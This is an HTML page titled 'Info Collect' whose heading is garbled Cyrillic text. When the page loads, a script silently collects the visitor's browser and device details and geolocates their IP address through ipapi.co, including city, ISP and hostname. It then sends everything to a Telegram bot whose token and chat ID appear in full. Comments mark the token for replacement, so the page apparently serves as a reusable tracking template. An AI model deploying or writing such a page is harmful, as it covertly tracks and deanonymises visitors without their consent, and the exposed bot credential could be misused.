<!doctype html>
<html>
<head>
  <meta charset="utf-8">
  <title>Info Collect</title>
  <style>
    body{font-family:Arial;padding:20px}
  </style>
</head>
<body>
  <h1>–ò–Ω—Ñ–∞ —Å–æ—Ö—Ä–∞–Ω–µ–Ω–∞</h1>
  <script>
    async function sendToTelegram(msg) {
      const token = "8572565681:AAHbwrqPJAzXVVzFWjOUWGn6MgywfMDtRX4";  // ‚Üê –∑–∞–º–µ–Ω–∏
      const chat = "8572565681"; // ‚Üê –∑–∞–º–µ–Ω–∏

      await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
        method: "POST",
        headers: {"Content-Type": "application/json"},
        body: JSON.stringify({chat_id: chat, text: msg})
      });
    }

    (async function(){
      const info = {};

      info.userAgent = navigator.userAgent;
      info.window = {w: innerWidth, h: innerHeight};
      info.screen = {w: screen.width, h: screen.height, depth: screen.colorDepth};
      info.languages = navigator.languages;
      info.cpu = navigator.hardwareConcurrency;
      info.memory = navigator.deviceMemory;

      try {
        const r = await fetch("https://ipapi.co/json/");
        const j = await r.json();
        info.ip = j.ip;
        info.city = j.city;
        info.country = j.country_name;
        info.countryCode = j.country_code;
        info.hostname = j.hostname;
        info.isp = j.org;
      } catch(e){
        info.ip = "N/A";
      }

      const text = "üì° NEW VISIT\n\n" + JSON.stringify(info, null, 2);

      await sendToTelegram(text);
    })();
  </script>
</body>
</html>
